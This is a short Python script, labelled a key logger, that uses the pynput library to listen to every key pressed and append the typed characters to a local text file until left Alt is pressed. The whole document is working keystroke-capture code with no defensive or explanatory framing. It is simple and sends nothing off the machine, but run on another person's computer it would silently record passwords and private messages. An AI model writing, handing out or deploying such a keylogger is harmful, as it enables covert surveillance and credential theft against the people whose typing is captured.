##  key logger

from pynput import keyboard

f=open("Keyboardcontent.txt","a+")
f.write("   ")

def onpress(k):
    if k==keyboard.Key.alt_l:      ## check to terminate
        return False
    elif k==keyboard.Key.space:     ## add space in file  
        f.write(" ")    
    elif k==keyboard.Key.backspace:
        f.write("")
    else:
        try:
            # print('{0}'.format(k.char))
            f.write("{0}".format(k.char))
        except:
            print("{0}".format(k))

with keyboard.Listener(on_press=onpress) as listen:
    listen.join()